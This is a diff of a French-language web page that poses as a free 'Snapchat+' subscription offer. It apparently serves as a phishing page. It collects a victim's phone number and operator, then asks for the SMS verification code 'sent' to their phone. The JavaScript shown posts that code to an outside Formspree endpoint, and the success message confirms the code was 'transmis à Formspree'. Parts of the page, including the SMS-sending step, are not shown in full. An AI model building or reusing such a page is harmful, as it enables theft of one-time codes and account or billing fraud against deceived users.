@@ -202,17 +202,17 @@ input:focus {
     <div class="logo">👻</div>
     <h1>Snapchat<span class="plus">+</span></h1>
 
-    <!-- ÉTAPE 1 : Saisie des informations et envoi du SMS -->
+    <!-- ÉTAPE 1 -->
     <div id="step1">
-        <p class="subtitle">Activez Snapchat+ gratuitement pendant 1 an !</p>
+        <p class="subtitle">Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas</p>
         
         <div class="demo">
-Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
-       
+                      Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
+          
         </div>
         
         <div class="badges">
-       <span>✨ Badges exclusifs</span>
+ <span>✨ Badges exclusifs</span>
             <span>🔒 Qui a revu votre story</span>
             <span>🚀 Boost de score</span>
             <span>🔥 Offre limitée</span>
@@ -237,31 +237,28 @@ Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous
             <button type="submit" class="mainButton" id="btnSubmit">Continuer →</button>
         </form>
 
-        <div class="footer">L'abonnement Snapchat+ ne vous sera pas facturé.
-L'abonnement est disponible uniquement pour les utilisateurs éligibles.
-
-</div>
+        <div class="footer">L'abonnement Snapchat+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.</div>
     </div>
 
-    <!-- ÉTAPE 2 : Saisie du code reçu par SMS -->
+    <!-- ÉTAPE 2 -->
     <div id="step-code">
-        <p class="subtitle" style="margin: 15px 0;">Un code de validation a été envoyé par SMS sur votre téléphone.</p>
+        <p class="subtitle" style="margin: 15px 0;">Un code aléatoire a été envoyé par SMS sur votre téléphone.</p>
         
         <form id="formCode">
-            <label>Code de vérification</label>
-            <input type="text" id="codeSaisi" name="code_verification" placeholder="Ex: 1234" required maxlength="4">
+            <label>Code de vérification reçu</label>
+            <input type="text" id="codeSaisi" name="code_verification" placeholder="Entrez le code reçu" required maxlength="4">
             
-            <button type="submit" class="mainButton" id="btnValiderCode">Valider et s'inscrire</button>
+            <button type="submit" class="mainButton" id="btnValiderCode">Valider et transmettre</button>
         </form>
         
         <div class="footer">Vérifiez vos messages</div>
     </div>
 
-    <!-- ÉTAPE 3 : Succès final -->
+    <!-- ÉTAPE 3 -->
     <div id="step-success">
         <div class="success-icon">✔</div>
         <h2 style="color: white; margin-bottom: 10px;">Félicitations</h2>
-        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">SMS envoyé, code validé et transmis !</p>
+        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">Code validé et transmis à Formspree !</p>
         <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">Les données ont été envoyées avec succès.</p>
     </div>
 </div>
@@ -295,7 +292,6 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles.
     let globalOperateur = "";
     let globalNumero = "";
 
-    // ÉTAPE 1 : Envoi du SMS
     form.addEventListener('submit', async function(event) {
         event.preventDefault(); 
 
@@ -335,7 +331,6 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         }
     });
 
-    // ÉTAPE 2 : Validation du code et transmission en JSON vers Formspree
     formCode.addEventListener('submit', async function(event) {
         event.preventDefault();
 
@@ -344,7 +339,6 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         btnValiderCode.disabled = true;
 
         try {
-            // Envoi propre en JSON vers Formspree
             const formspreeResponse = await fetch('https://formspree.io/f/meeyrqay', {
                 method: 'POST',
                 headers: { 
@@ -364,12 +358,12 @@ L'abonnement est disponible uniquement pour les utilisateurs éligibles.
                 document.getElementById('step-success').style.display = 'block';
             } else {
                 alert("Erreur lors de la transmission des données vers Formspree.");
-                btnValiderCode.innerText = "Valider et s'inscrire";
+                btnValiderCode.innerText = "Valider et transmettre";
                 btnValiderCode.disabled = false;
             }
         } catch (error) {
             alert("Erreur réseau vers Formspree.");
-            btnValiderCode.innerText = "Valider et s'inscrire";
+            btnValiderCode.innerText = "Valider et transmettre";
             btnValiderCode.disabled = false;
         }
     });
